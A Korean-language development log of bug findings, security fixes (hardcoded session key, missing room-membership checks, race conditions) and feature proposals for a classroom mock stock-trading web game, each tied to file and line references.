- **`minigame_spin()` 주식 청산 후 `shares=0` 인 `RoomHolding` 레코드 DB에 방치** (`app.py:1037-1038`): 룰렛 베팅 자금 마련을 위해 보유 주식 전량 청산 시 `h.shares = 0; h.avg_price = 0` 으로 설정만 하고 `db.session.delete(h)` 가 없음 (비교: `_end_room()` line 152에서는 delete 처리). `get_portfolio()` 에서 `if h.shares <= 0: continue` 로 필터링(line 782)하지만 DB에 쓸모없는 레코드가 쌓이고 `RoomHolding.query.filter_by(room_id=rid, user_id=uid).all()` 쿼리 결과에 포함되어 루프 비용 증가. `h.shares = 0` 이 되는 라인(`app.py:1037`) 다음에 `db.session.delete(h)` 한 줄 추가로 즉각 해결.

- **`host_adjust()` `note` 파라미터 200자 미만 검증 누락 — DB 스키마 불일치** (`app.py:596-603`): `RoomTransaction.note = db.Column(db.String(200))` 이지만 `host_adjust()` 에서 `note = d.get('note', '진행자 자산 조정')` 의 길이를 검증하지 않음. SQLite는 String(200) 제한을 강제하지 않으므로 현재는 무해하지만, PostgreSQL 등 다른 DB로 마이그레이션 시 200자 초과 note 저장 시 에러 발생. `app.js:491` 의 `adj-note` 입력란에도 `maxlength` 속성이 없음. 서버에서 `note = d.get('note', '진행자 자산 조정')[:200]` 으로 truncate하고, HTML `<input id="adj-note" ... maxlength="200">` 한 줄 추가로 완전 해결.

- **`get_history()` `interval` 파라미터 수신 후 무시 — API 계약 불일치** (`stock_service.py:281, 292`; `app.py:718`): `get_history(symbol, period, interval)` 에서 `interval` 을 인자로 받지만 `n_bars = {'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}` 고정값만 사용. 클라이언트에서 `period='1d'`를 요청하면 interval='5m' (하루 78봉 기대)이지만 실제로는 30개 봉 반환 — 레이블이 일봉이므로 "오늘 하루" 차트가 30일 월봉처럼 보임. `interval` 파라미터를 삭제하거나, `n_bars` 를 `{'1d': 78, '5d': 390, '1mo': 30, '3mo': 90}` 으로 interval에 맞게 조정하여 계약 일관성 확보. 교육용이므로 큰 영향은 없으나 `stock_service.py:281` 서명 수정이 필요.

---

## 2026-08-04

### 추가하면 좋을 기능

- **진행자 대시보드에 학급 전체 종목 보유 현황(히트맵) 추가** (`app.py:542-562` `host_members()`; `app.py:107-118` `member_total_value()`): 현재 진행자는 개인별 총자산·수익률만 볼 수 있고 학급 전체가 어떤 종목을 얼마나 보유하는지 집계 데이터가 없음. `GET /api/rooms/<rid>/host/holdings-summary` 신규 엔드포인트에서 `RoomHolding.query.filter_by(room_id=rid).all()` 로 전체 보유 현황을 `{symbol: total_shares}` 형태로 집계하고, 진행자 시장 탭에 "학급 보유 TOP 5 종목" 테이블을 추가하면 "이 종목에 투자한 학생이 10명" 같은 수업 화제를 제공할 수 있음. 서버 약 15줄, 클라이언트 소형 테이블 렌더링.

- **퀴즈 설정 및 룰렛 설정을 DB에 저장** (`app.py:250-251` `_roulette_config`; `app.py:1245-1246` `_quiz_settings`; `models.py:25-42` `Room`): `_quiz_settings`와 `_roulette_config`는 순수 인메모리로 Render 무료 티어의 15분 비활성 후 서버 재시작 시 초기화됨. `lottery_rounds_done`(`app.py:228-229`)처럼 DB 컬럼에 JSON 직렬화해 저장하면 재시작 후에도 설정 유지 가능. `Room` 모델에 `quiz_settings = db.Column(db.String(200), default='{}')`, `roulette_config = db.Column(db.String(500), default='{}')` 컬럼 추가 후, `quiz_settings()` POST / `host_roulette_config()` POST에서 `db.session.commit()` 처리. `ALTER TABLE` 마이그레이션을 기존 `app.py:31-40` 패턴으로 추가하면 됨.

- **참여자 게임 화면에서 주가 자동 폴링 추가** (`app.js:269-274` `enterHostGame()`; 참여자 게임 폴링 루프): 진행자 화면은 10초마다 `loadHostMarket()`을 호출하지만(`app.js:269`), 참여자 시장 탭은 수동 새로고침 버튼(↻)에만 의존함. 참여자의 10초 폴링 루프 안에서 `if (S.currentPage === 'market') loadMarket();` 한 줄을 추가하면 탭을 열어 둔 채 20초 주기로 가격이 자동 갱신됨(주가 TTL=20초와 동기화). `loadMarket()` 함수는 이미 구현됨.

- **거래 내역에서 룰렛·복권·예금 트랜잭션에 올바른 한글 라벨 표시** (`app.py:619-622` `host_member_transactions()`; `app.py:840-842` `get_transactions()`): `action='RLT'`일 때 `symbol='ROULETTE'`이지만 `STOCKS.get('ROULETTE', {}).get('name', '자산조정')`로 '자산조정' 라벨이 나와 룰렛 거래가 자산조정으로 보임. `SPECIAL_SYMBOLS = {'ROULETTE': '룰렛 미니게임', 'LOTTO': '복권 추첨', 'DEPOSIT': '예금 관련'}` 딕셔너리를 `stock_service.py` 또는 `app.py` 상단에 추가하고, 해당 두 곳에서 `SPECIAL_SYMBOLS.get(t.symbol) or STOCKS.get(t.symbol, {}).get('name', '자산조정')`로 교체하면 됨. 각 2줄 수정으로 거래 내역 가독성 향상.

- **호스트 게임 화면에서 실시간 순위 자동 갱신 간격 단축 (가변 설정)** (`app.js:269-274` `enterHostGame()`; `app.py:808-824` `get_rankings()`): 현재 진행자 랭킹 폴링이 `setInterval(..., 10000)` 고정. 게임 종료 직전 흥분되는 순간에는 5초, 한가한 중반에는 15초 등 진행자가 폴링 속도를 조절하면 서버 부하와 UX 모두 개선. 진행자 설정 탭에 "순위 갱신 주기(초)" 슬라이더(5~30)를 추가하고, `clearInterval(S.pollInterval); S.pollInterval = setInterval(..., newMs)` 패턴으로 재설정. 서버 변경 없이 클라이언트 약 15줄.

### 제거/단순화할 것들

- **`app.secret_key` 기본값이 하드코딩된 공개 문자열** (`app.py:13`): `'mock-stock-game-secret-2024'`가 코드에 명시되어 있어 환경변수 미설정 시 누구나 Flask 세션을 위조 가능. Render 무료 환경에서 `SECRET_KEY` 미설정 배포가 쉽게 발생할 수 있음. `os.environ.get('SECRET_KEY')` 만 사용하고 없으면 `os.urandom(32).hex()` 로 매 시작마다 새 키를 생성하거나 (재시작 시 세션 무효화 허용), 환경 변수 미설정 시 명시적 `ValueError` 경고를 `logging.warning()`으로 출력해 운영자에게 알리는 것이 안전함. 단순 수정이지만 보안 필수.

- **`member_total_value()` 에서 매번 개별 DB 쿼리 — 랭킹 조회 시 O(N×M) 쿼리 발생** (`app.py:107-118` `member_total_value()`; `app.py:808-824` `get_rankings()`): `get_rankings()`는 멤버 N명 각각에 대해 `member_total_value()`를 호출하고, 내부에서 `RoomHolding.query.filter_by(room_id, user_id)`, `Deposit.query.filter_by(room_id, user_id)` 를 개별 실행. 30명 방이면 랭킹 1회 조회에 최소 60+ DB 쿼리 발생. `RoomHolding.query.filter_by(room_id=rid).all()`과 `Deposit.query.filter_by(room_id=rid, status='active').all()`을 한 번씩 벌크 조회 후 `{user_id: [...]}` 딕셔너리로 변환해 `member_total_value` 계산을 일괄 처리하면 2회 쿼리로 줄어듦. `get_rankings()` (`app.py:808`) 내부에서 직접 구현 권장.

- **`enter()` 에서 `username` 내부 공백 정규화 누락** (`app.py:329-342` `enter()`; `app.js:73-79` `doAuth()`): `request.json.get('username','').strip()`으로 앞뒤 공백만 제거하고 내부 연속 공백은 그대로 둠. 학번·이름을 `f"{sid} {name}"`으로 합칠 때(`app.js:75`) 학번에 공백이 포함되면 "20715  홍길동" 과 "20715 홍길동"이 다른 유저로 등록됨. `username = ' '.join(u.split())` 한 줄 추가(`app.py:334` 직후)로 내부 공백 정규화 가능. 동일 교실 학생이 오타로 중복 계정을 만드는 상황 방지.

- **`_lots`, `_quiz_state` 등 인메모리 딕셔너리에 waiting 상태 room의 항목 누적** (`app.py:155-162` `_end_room()`): `_end_room()`이 호출될 때 `_quiz_settings.pop(room.id)`, `_roulette_config.pop(room.id)` 등을 정리하지만, `waiting` 상태로 방치된 방(호스트가 방 만들고 게임 시작 안 한 채 이탈)은 `_end_room()`이 절대 호출되지 않아 in-memory에 적재되지 않음. 대신 해당 방에 quiz 설정을 POST 한 뒤 방이 abandoned되면 딕셔너리에 항목이 남음. 서버가 24시간 운영된다면 의미 없는 항목이 쌓임. `create_room()`의 stale 방 정리 로직(`app.py:371-379`)을 `waiting` 상태의 오래된 방에도 적용하면 해결됨 (`Room.status == 'waiting'`, `created_at < 6시간 전` 조건).

- **`get_room()` 에서 `_auto_start_lottery_if_due()` 호출이 매 GET 폴링마다 DB commit 유발** (`app.py:432-473` `get_room()`; `app.py:408-430` `_auto_start_lottery_if_due()`): 모든 학생이 10초마다 `GET /api/rooms/<rid>`를 호출하고, 각 호출에서 `_auto_start_lottery_if_due()`가 실행됨. 복권 트리거 조건이 충족되기 전까지는 아무 일도 없지만, 충족 시 `with _lottery_lock:` 내에서 `room.status = 'paused'; db.session.commit()`을 여러 스레드가 경쟁적으로 실행할 수 있음. 이미 `lottery_lock`으로 보호되어 중복 실행 방지는 됨. 그러나 `_lot_round_due()` 계산 결과가 None이 아닐 때만 `_lottery_lock` 진입하도록, 트리거 조건 체크를 lock 밖으로 이동하면 lock 경합을 줄일 수 있음. (`app.py:408-414`, 조건 분기 재배치)

---

## 2026-08-04 (2차)

### 추가하면 좋을 기능

- **진행자 "학생 포트폴리오 관찰" 모달** (`app.py:772-803` `get_portfolio()`; `app.js:408-431` `loadHostMembers()`): `GET /api/rooms/<rid>/host/members/<uid>/portfolio` 신규 엔드포인트를 추가해 진행자 권한으로 특정 학생의 현금·보유주식·예금·수익률을 조회. 진행자 순위 패널 각 행에 "📊 보기" 버튼을 추가하면 클릭 시 해당 학생의 포트폴리오가 모달로 표시됨. "이 학생의 전략을 살펴봅시다" 수업 활용 가능. 기존 `get_portfolio()`에서 `user_id` 파라미터만 외부 주입하도록 리팩터링하면 서버 약 10줄, 클라이언트 모달 25줄로 완성.

- **뉴스 수신 히스토리 보관 및 "뉴스 아카이브" UI** (`app.js:1148-1178` `showBombNews()`; 참여자 게임 화면): 현재 폭탄뉴스는 3초 표시 후 사라지고 기록이 없음. `S.newsHistory = []` 배열에 `showBombNews()` 호출 시마다 `{ts: new Date(), items}` 를 push하고, 시장 탭 우상단 "📰" 버튼 클릭 시 시간 역순 뉴스 타임라인 모달을 표시. "10분 전 뉴스를 보고 어떤 판단을 했는지 복기해봅시다" 수업 피드백에 직결됨. `showBombNews()` 말미에 1줄 추가, 아카이브 모달 약 20줄.

- **호스트 대시보드 "학급 자산 구성 도넛차트"** (`app.py:542-562` `host_members()`; `app.js:433-478` `renderHostBarChart()`): `host_members()` 응답에 각 멤버의 `cash_total`, `stock_total`, `deposit_total` 집계 필드를 포함하고, 진행자 순위탭 상단에 전체 학급의 현금/주식/예금 비율 도넛차트를 추가. "학급 현금 보유 75% → 대부분 학생이 아직 주식 진입을 주저" 같은 즉각 파악 가능. 서버 3필드 추가, 클라이언트 Chart.js 도넛 약 20줄.

- **주가 변동 시 Web Audio API 비프음 피드백** (`app.js:1313-1323` `renderGrid()` flash 처리 부분): `renderGrid()` 내 `flash-up`/`flash-down` 클래스 추가 직후 `AudioContext`로 짧은 비프음 (오름: 880Hz 0.1초, 내림: 440Hz 0.1초) 출력. 외부 라이브러리 불필요. 헤더에 소리 ON/OFF 토글 버튼(🔊/🔇)을 추가하고 `localStorage`로 설정 저장. 시각 장애 학생 접근성 향상 및 수업 몰입감 상승. JS 약 15줄.

- **퀴즈 "4지선다" 유형 지원** (`education_data.py` QUIZ_QUESTIONS; `app.py:1248-1268` `get_quiz()`; `app.js:832-868` `openQuiz()`): `QUIZ_QUESTIONS` 항목에 `'type': 'mc', 'choices': ['가', '나', '다', '라']` 선택적 필드를 추가. `get_quiz()` 응답에 `choices` 포함 시 클라이언트 `openQuiz()`가 O/X 버튼 대신 최대 4개 선택지 버튼을 렌더링. `submit_quiz()`에서 `answer`를 index로 처리하도록 `q['a']` 타입 분기. 기존 O/X 문제와 완전 하위호환. 단순 O/X보다 교육적 깊이 향상.

- **게임 로비에서 "학번-이름 형식 확인" 시각 강조** (`app.js:219-231` `loadLobbyMembers()`; `app.py:577-585` `lobby_members()`): 현재 로비에서 참여자 닉네임이 단순 리스트로만 표시됨. 진행자 로비 화면에 "형식 확인" 토글을 추가해 ON 시 닉네임을 공백 기준으로 파싱해 `[학번]`과 `이름`을 색상 분리 표시. 학생이 `"1234 홍길동"` 대신 `"홍길동"` 또는 `"ㅋㅋㅋ 홍길동"`처럼 잘못 입력한 케이스를 게임 시작 전에 육안으로 파악 가능. HTML 3줄, JS 5줄.

### 제거/단순화할 것들

- **`trade()` BUY 동시 요청 시 현금 이중 차감 race condition** (`app.py:747-750`, `app.py:765`): 두 스레드가 동시에 BUY 요청 시 `member.cash` READ → 잔액 체크 → DB write 흐름이 직렬화되지 않음. SQLite WAL이 write를 직렬화하지만 Flask 스레드 두 개가 동시에 READ하면 같은 잔액 값을 읽고 둘 다 통과 → cash가 의도보다 두 배 차감 가능. `RoomMember.query.filter_by(room_id=rid, user_id=user.id).with_for_update().first()` (PostgreSQL 이전 대비) 혹은 `(rid, user.id)` 키 단위 `threading.Lock()`으로 trade 섹션을 감싸면 해결. SQLite 사용 중에는 `PRAGMA busy_timeout=5000`(이미 설정)이 write 충돌은 막으나 read 충돌에는 무효.

- **`StockService._prev` 딕셔너리가 게임 시작 가격으로 고정 — 변동률이 현재-직전 비교가 아닌 현재-시작 누적 비교** (`stock_service.py:108-127, 278`): `_init_prices()`에서만 `_prev[sym]` 설정, `get_price()` 에서 가격이 갱신되어도 `_prev` 미갱신. 결과적으로 학생이 보는 "▲ +12.5%" 배지가 직전 20초 주기 대비가 아닌 게임 시작 이후 누적 등락률을 나타냄. 교육적으로 잘못된 정보 제공. `get_price()` 내 `new_price = self._next_price(...)` 계산 직전(`stock_service.py:184`)에 `self._prev[sym] = price` 한 줄 추가.

- **`get_stocks()` · `get_chart()` 방 멤버십 검증 없이 room_id만으로 타 방 시세·차트 열람 가능** (`app.py:651-671` `get_stocks()`; `app.py:710-719` `get_chart()`): 두 엔드포인트 모두 `Room.query.get_or_404(rid)` 후 호스트·멤버 여부 미확인. 로그인된 임의 사용자가 다른 방 ID를 추측하면 전체 시세 목록과 봉차트를 열람 가능. `host_members()`(`app.py:547`) 패턴으로 각 엔드포인트에 `if room.host_id != user.id and not RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(): return jsonify({'error': '권한 없음'}), 403` 추가.

- **`submit_quiz()` 쿨다운 체크 비원자적 — 타이머 자동 제출과 버튼 클릭 동시 도달 시 보상 2회 지급 가능** (`app.py:1278-1341`): `_quiz_state[key]` 읽기(`state.get('cooldown_until', 0) > time.time()`, `app.py:1279`)와 갱신(`_quiz_state[key] = {..., 'cooldown_until': time.time() + 60}`, `app.py:1341`) 사이에 Lock 없음. 클라이언트 30초 타이머 만료 자동 제출(`app.js:864`)과 사용자 버튼 클릭이 동시에 서버 도달 시 두 요청 모두 `cooldown_until=0`을 읽고 통과 → 최대 보상/패널티 2회 지급. `_quiz_state_lock = threading.Lock()`(`app.py:1245` 근처) 추가 후 `submit_quiz()` 내 state 조회부터 갱신까지 `with _quiz_state_lock:` 로 감싸면 해결.

- **`loadParticipantRankings()` 오류 응답 수신 시 `TypeError: data.map is not a function` 발생** (`app.js:1678-1691`): `const data = await api.get(...)` 후 `if (!data.length)` 조건에서 `data`가 `{error: 'HTTP 500'}` 객체이면 `.length`는 `undefined`(falsy)로 평가되어 else 분기 진입 → `data.map(e => ...)` 에서 `TypeError` 발생, 화면 완전 멈춤. `if (!Array.isArray(data) || data.error)` 조건으로 교체하면 안전하게 빈 상태 표시.

- **`create_room()` stale 방 정리 조건에 `waiting` 상태 미포함 — 게임 시작 없이 이탈 시 영구 재입장 불가** (`app.py:371-381`): stale 방 정리 조건이 `Room.status.in_(['active','paused'])` 이고 `end_time < stale_cutoff` 이므로 `status='waiting'` 인 방은 제외됨. 진행자가 방을 만들고 게임을 시작하지 않은 채 이탈하면 재접속 시 "이미 진행 중인 방이 있습니다." 오류를 영구적으로 받게 됨. 같은 블록에 `or Room.query.filter(Room.host_id == user.id, Room.status == 'waiting', Room.created_at < datetime.utcnow() - timedelta(hours=6)).first()` 조건을 추가해 오래된 대기방도 자동 정리.

---

## 2026-08-05

### 추가하면 좋을 기능

- **자산 조정 시 해당 학생 화면에 즉시 토스트 알림** (`app.py:587-603`, `host_adjust()`; `app.js:613-650`, 주 폴링 루프): 진행자가 학생 자산을 `ADJ` 트랜잭션으로 조정해도(`app.py:600`) 대상 학생 화면에는 아무 알림이 없어, 다음 10초 폴링에서야 total_value 변화를 눈치챌 뿐 원인을 알 수 없음. `host_adjust()` 내에서 `_pending_adj: dict = {}  # room_id -> {user_id: {delta, note, ts}}` in-memory 딕셔너리에 기록하고, 참여자 폴링(`GET /api/rooms/<rid>`) 응답에 `pending_adj: {delta, note}`를 포함해 한 번만 전달 후 즉시 삭제하면 됨. 클라이언트에서 `if (r.pending_adj) toast(r.pending_adj.note + ' ' + krw(r.pending_adj.delta), 'info')`로 처리. 서버 약 10줄·클라이언트 2줄로 "진행자가 +500,000원 이벤트 보상을 지급했습니다" 수업 흐름 개선.

- **복권 미제출 학생 자동 랜덤 번호 배정** (`app.py:201-240`, `_do_reveal()`; `app.py:1122-1128`, `get_lottery()` 타임아웃 전이): `_do_reveal()`에서 `cur.get('picks', {}).items()`만 순회하므로 60초 내 번호를 제출하지 않은 학생은 결과 화면에 전혀 등장하지 않고 상금 기회를 잃음. `_do_reveal()` 시작 시 `all_uids = [m.user_id for m in RoomMember.query.filter_by(room_id=rid).all() if m.user_id != host_id]` 로 전체 참여자를 조회해 picks가 없는 uid에 `sorted(random.sample(range(1,46), 6))`를 자동 배정하면(`cur['picks'].setdefault(str(uid), auto_nums)`) 미제출자도 결과에 포함됨. UI에서 자동 배정 번호는 회색으로 표시해 직접 제출과 구분. 공정성을 높이고 게임 참여 유도 효과.

- **진행자 "⚡ 퀴즈 타임" 즉시 발동 — 전체 학생 동시 팝업** (`app.py:1248-1268`, `get_quiz()`; `app.js:831-868`, `openQuiz()`): 현재 퀴즈는 학생이 자발적으로 FAB 버튼을 누를 때만 도전 가능해 수업 타이밍에 맞게 활용하기 어려움. `_quiz_broadcast: dict = {}  # room_id -> {qid: int, expires_at: float}` in-memory 상태와 `POST /api/rooms/<rid>/host/quiz-broadcast` 엔드포인트를 추가해 특정 문제 ID와 30초 만료 시간을 설정하면, 참여자 `GET /api/rooms/<rid>/quiz` 응답에 `broadcast_qid`를 포함시켜 클라이언트가 자동으로 `openQuiz()`를 호출하도록 트리거. 진행자 설정 탭에 "⚡ 퀴즈 타임 발동" 버튼 1개 추가. 서버 약 15줄·클라이언트 약 10줄. 수업 중 정해진 시간에 전체 학생 동시 참여로 교육 효과 극대화.

- **엑셀 내보내기에 학생별 거래 내역 시트 추가** (`app.py:1419-1488`, `export_rankings()`): 현재 Excel 파일은 '최종 순위' 시트 1개만 생성해 교사가 "이 학생은 왜 이런 수익률이 나왔나?"를 사후 분석하기 어려움. `for m in board: ws = wb.create_sheet(m['name'][:31]); ws.append(['시각','종목','구분','수량','가격','금액','메모']); for t in RoomTransaction.query.filter_by(room_id=rid, user_id=m['user_id_raw']).order_by(RoomTransaction.timestamp):` 형태로 추가 시트 생성 가능. `m['name'][:31]`은 Excel 시트명 31자 제한 준수(`openpyxl` 자동 에러 방지). `board` 리스트에 `user_id_raw` 필드를 유지하도록 `app.py:1438`에 `'user_id_raw': m.user_id` 추가. 추가 서버 약 25줄로 교사 수업 마무리 분석 자료 대폭 강화.

- **뉴스 폴링 8초 + 주 폴링 10초 중복 호출 최적화** (`app.js:807-818`, `startNewsPolling()`; `app.py:703-708`, `get_room_news()`): 참여자 30명 교실에서 `startNewsPolling()`(app.js:810)이 8초마다 1회·`S.pollInterval`(app.js:613)이 10초마다 1회씩 호출해 서버에 분당 각 ~225회·~180회 = 총 ~405회 API 요청 발생(뉴스+룸 상태). Render free tier 단일 스레드 Flask 환경에서 부하 집중. `get_room_news()` 응답 데이터(`{timestamp, items, show_hint}`)를 `get_room()` 응답에 `news` 필드로 통합하면 별도 뉴스 폴링이 불필요해 요청 수를 절반으로 감소. 단, 뉴스 응답에 2초 캐시가 이미 적용됨(`app.py:75`)—통합 시 룸 캐시(1.5초)와 공유. `startNewsPolling()` 대신 주 폴링 콜백에서 `r.news`로 변화 감지 후 `showBombNews()` 호출 방식으로 전환.

### 제거/단순화할 것들

- **`get_history()` 역방향 랜덤워크에 가격 클램프 미적용 — 실제 게임 범위 벗어난 차트** (`stock_service.py:281-310`, `get_history()`): 차트 데이터를 현재가(`current`)에서 역방향 `random.gauss(0, vol * 0.5)` 워크로 생성(`stock_service.py:299`)하는데, `_next_price()`의 `max(base*0.6, min(base*1.4, new_price))` 클램프가 없음. 결과적으로 가격 차트에 실제 게임에서 도달 불가능한 극단값(base의 0.3배 또는 2.0배)이 표시됨. 예: 삼성전자 base=72,000원이면 차트에 20,000원대 또는 140,000원대 바가 등장 가능. 학생들이 잘못된 역사적 가격 패턴을 전략 판단에 활용하는 위험. `stock_service.py:300`에서 `c = round(max(base * 0.6, min(base * 1.4, max(1.0, o * (1 + random.gauss(0, vol * 0.5))))))`로 `_next_price()` 클램프와 동일하게 1줄 수정으로 해결.

- **`_quiz_settings` / `_roulette_config` 서버 재시작 후 소실 — Render Cold Start 시 진행자 설정 초기화** (`app.py:1246-1251`, `_quiz_settings = {}`; `app.py:250-251`, `_roulette_config = {}`): Render free tier는 비활성 15분 후 컨테이너를 종료하며 재시작 시 두 in-memory 딕셔너리가 초기화됨. 게임 중간 재시작이면 진행자가 설정한 퀴즈 보상 비율(예: 3.0%)이 1.0%로, 룰렛 배율이 기본값으로 돌아감. 기존 `app.py:31-40`의 `ALTER TABLE rooms ADD COLUMN` 패턴을 재사용해 `quiz_settings VARCHAR(50) DEFAULT '1.0,0.5'`와 `rlt_config VARCHAR(100) DEFAULT '0,1,2,5,25|70,20,7,2,1'` 컬럼을 `rooms` 테이블에 추가하면 영구 저장 가능. 진행자가 설정 탭에서 저장할 때 DB에도 기록, `get_room()` 또는 `enterHostGame()` 시 DB에서 복원. 추가 마이그레이션 코드 약 6줄, 설정 저장·로드 각 2줄.

- **`member_total_value()` 가 게임 종료 후 `cleanup_room_service()` 이후에도 새 StockService를 생성해 초기 가격 반환** (`app.py:107-118`, `member_total_value()`; `app.py:154`, `cleanup_room_service()`; `app.py:1432`, `export_rankings()`): `_end_room()`에서 `cleanup_room_service(room.id)` 호출(`app.py:154`)로 StockService를 삭제하지만, 이후 `export_rankings()`에서 `member_total_value(rid, m.user_id)`를 호출(`app.py:1432`)하면 `get_room_service(rid)`가 새 빈 StockService를 생성해 초기 랜덤 가격을 반환. 그러나 `_end_room()` 내에서 이미 모든 `RoomHolding`을 현금화하고 `h.shares=0` 처리 후 `db.session.delete(h)`(`app.py:152`)하므로, `export_rankings()` 시점에는 `RoomHolding.query.filter_by(room_id=rid, user_id=uid)` 결과가 없어 `member_total_value()` 내 주식 평가 루프가 실제로 실행되지 않음. 결론적으로 `export_rankings()` 에서 `member_total_value()` 대신 `member.cash` 직접 사용이 더 명확하고 `get_room_service()`를 불필요하게 재생성하는 부작용 없음. `app.py:1432`를 `total = m.cash  # 종료 시 이미 현금 청산 완료` 로 교체하면 코드가 단순해지고 잠재적 사이드 이펙트 제거.

- **`doJoinRoom()` 의 `room.status === 'ended'` 분기가 도달 불가한 데드코드** (`app.js:158-169`, `doJoinRoom()`): `doJoinRoom()`에서 `api.post('/api/rooms/join', {code})` 호출 시, 서버 `join_room()`의 `if room.status == 'ended': return ... 400`(`app.py:398`)이 먼저 반환돼 클라이언트는 항상 `data.error`를 받음. `r.json()`이 `{error: '이미 종료된 방입니다.'}` 이고 `if (data.error)` 분기에서 처리되므로 `if (S.room.status === 'ended')` 분기(`app.js:160-164`)는 실제로 실행되지 않음. 혼동을 방지하기 위해 `app.js:158-165`의 ended 분기를 제거하고 주석으로 "종료된 방 입장 시도는 서버가 400 오류를 반환하므로 이 분기는 도달하지 않음"으로 대체. 또는 `resumeRoom()`(`app.js:171-183`) 경로(세션 재접속)에서는 ended 분기가 유효하므로 두 경로 혼동이 없도록 `doJoinRoom()`에서만 제거.

- **`host_members()` 정렬 후 `rank` 부여가 동점 처리 없이 순서만으로 결정** (`app.py:548-562`, `host_members()`; `app.py:815-824`, `get_rankings()`): `result.sort(key=lambda x: x['total_value'], reverse=True)`(`app.py:560`) 후 `enumerate`로 rank를 1부터 순차 부여하므로 두 학생의 `total_value`가 동일하면 DB 조회 순서에 따라 rank가 결정됨. 실제 주식 게임에서 동점(1원 단위까지 같을 가능성은 낮지만 진행자 `host_adjust()`로 동점 조작 가능)이 발생하면 한 학생이 1위, 다른 학생이 2위로 표시되는 불공정 상황. `rank` 부여 시 `if i > 0 and result[i]['total_value'] == result[i-1]['total_value']: result[i]['rank'] = result[i-1]['rank']` 로 동점 처리를 추가하면 됨(약 3줄). 교실 게임 특성상 학생 간 공정한 동점 처리가 중요.

## 2026-08-05 (2차)

### 추가하면 좋을 기능

- **게임 설정 프리셋 버튼** (`static/index.html` 방 만들기 폼; `app.js:120-140`, `doCreateRoom()`): 방 만들기 화면에 "⚡ 단기(15분, 500만)" · "📊 표준(30분, 1000만)" · "🏆 장기(60분, 2000만)" 버튼 3개를 추가해 클릭하면 `room-duration`·`room-cash`·`room-rate` 입력값이 자동 채워짐. 서버 변경 없이 HTML 버튼 3개 + JS 6줄로 구현 가능: `function applyPreset(min,cash,rate){document.getElementById('room-duration').value=min; document.getElementById('room-cash').value=cash; document.getElementById('room-rate').value=rate;}`. 교사가 수업 시작 직전 설정 시간을 줄여 주며 "어떤 프리셋이 이 수업에 어울릴까?" 토론도 유발 가능.

- **단체 강제 매수 이벤트 (진행자용)** (`app.py:1345-1360`, `host_market_event()` 구조 참조; `app.py:new`): `POST /api/rooms/<rid>/host/force-trade` 엔드포인트에서 `{symbol, shares, action}` 을 받아 `RoomMember.query.filter_by(room_id=rid).all()` 를 순회하며 `price = svc.get_price(symbol)` 현재가로 현금이 충분한 학생에게 강제 `BUY`(또는 `SELL`) 처리 + `RoomTransaction` 기록. "버블 붕괴 시나리오"나 "공매도 실습" 같은 수업 연출 도구로 활용 가능하며, 섹터 이벤트(`host_market_event()`) 코드 구조를 거의 그대로 재활용해 서버 약 35줄 추가. 진행자 이벤트 탭에 "강제 매수/매도" 드롭다운을 추가하면 완성.

- **포트폴리오 탭 섹터별 분산 막대 차트** (`app.js:1457-1566`, `loadPortfolio()`; `app.py:770-803`, `get_portfolio()`): `data.holdings`를 `sector`로 그룹화(`sectors = {}; holdings.forEach(h => sectors[h.sector] = (sectors[h.sector]||0) + h.current_value)`)해 Chart.js `bar` 타입 수평 막대 차트로 도넛 차트 아래에 시각화. 서버 변경 없이 `loadPortfolio()` 함수 마지막에 약 20줄 추가. `holdings` 응답에 이미 `sector` 필드가 포함돼 있어(`app.py:793`) 즉시 가능. "반도체에 너무 집중됐다"는 분산 투자 미흡을 학생이 직접 시각적으로 인지할 수 있어 교육 효과 탁월.

- **QR 코드 인쇄 최적화** (`app.js:212-217`, `openGameQR()`; `static/css/style.css`): 현재 "QR 인쇄" 흐름이 없어 교사가 프로젝터 대신 종이로 QR을 배포하려면 전체 화면을 캡처해 편집해야 함. `@media print { body > *:not(.modal) { display:none !important; } .modal:not(.open) { display:none !important; } #modal-game-qr .modal-box { box-shadow:none; border:none; width:auto; } }` CSS 약 8줄을 `style.css`에 추가하고, QR 모달 내부에 `<button onclick="window.print()" class="btn btn-sm">🖨️ 인쇄</button>` 1개를 배치하면 QR + 방 코드만 인쇄됨. 서버 변경 없음.

- **진행자 게임 현황 대시보드 위젯** (`app.py:806-824`, `get_rankings()`; `app.py:828-847`, `get_transactions()`): 진행자 랭킹 탭 상단에 "총 거래 건수 / 총 거래금액 / 가장 많이 거래된 종목" 세 위젯을 추가. `db.session.query(func.count(RoomTransaction.id), func.sum(RoomTransaction.amount)).filter_by(room_id=rid).first()` 와 `db.session.query(RoomTransaction.symbol, func.count(RoomTransaction.id)).filter_by(room_id=rid).group_by(RoomTransaction.symbol).order_by(func.count(RoomTransaction.id).desc()).first()` 두 쿼리로 수집. 서버 신규 엔드포인트 `GET /api/rooms/<rid>/host/stats` 약 15줄, 진행자 화면 위젯 HTML/JS 약 20줄. "오늘 수업에서 어떤 종목이 가장 인기 있었나?"를 수업 마무리 토론 주제로 활용 가능.

- **결과 화면에서 내 최다 보유 종목 및 수익/손실 요인 간략 요약** (`app.py:ended 상태 portfolio` 조회; `app.js:1694-1800` 결과 화면): 게임 종료 후 결과 화면(`screen-results`)에 "나의 전략 요약: 삼성전자를 가장 많이 보유했으며, 수익의 60%는 반도체 섹터에서 발생했습니다" 같은 1~2줄 요약을 표시. 종료 후 `member_total_value()` 는 이미 현금만 남아 있으므로(`app.py:152`, 청산 완료) 별도 계산이 필요하나, `RoomTransaction` 기록은 남아있어 `action='BUY'/'SELL'` 거래를 분석하면 top 종목 추출 가능. `GET /api/rooms/<rid>/transactions?page=1&per_page=100`을 클라이언트에서 집계하면 서버 변경 없이 구현 가능.

### 제거/단순화할 것들

